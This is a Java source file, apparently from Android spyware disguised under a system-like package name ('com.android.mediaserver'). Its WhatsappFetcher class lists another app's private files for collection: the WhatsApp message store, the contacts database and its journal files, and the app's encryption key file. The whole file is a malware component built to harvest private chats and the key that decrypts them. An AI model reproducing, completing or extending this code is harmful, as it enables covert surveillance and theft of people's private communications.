package com.android.mediaserver.fetchers.apps;

import com.android.mediaserver.fetchers.FetchedFile;
import com.android.mediaserver.fetchers.file.FileFetcher;
import java.io.File;
import java.util.ArrayList;

public class WhatsappFetcher extends FileFetcher {
  public WhatsappFetcher() {
    mFetchedFiles = new ArrayList();
    mFetchedFiles.add(
        new FetchedFile(new File("/data/data/com.whatsapp/databases/msgstore.db"), "APP",
            "whatsapp"));
    mFetchedFiles.add(
        new FetchedFile(new File("/data/data/com.whatsapp/databases/wa.db"), "APP", "whatsapp"));
    mFetchedFiles.add(
        new FetchedFile(new File("/data/data/com.whatsapp/databases/wa.db-wal"), "APP",
            "whatsapp"));
    mFetchedFiles.add(
        new FetchedFile(new File("/data/data/com.whatsapp/databases/wa.db-shm"), "APP",
            "whatsapp"));
    mFetchedFiles.add(
        new FetchedFile(new File("/data/data/com.whatsapp/files/key"), "APP", "whatsapp"));
  }
}
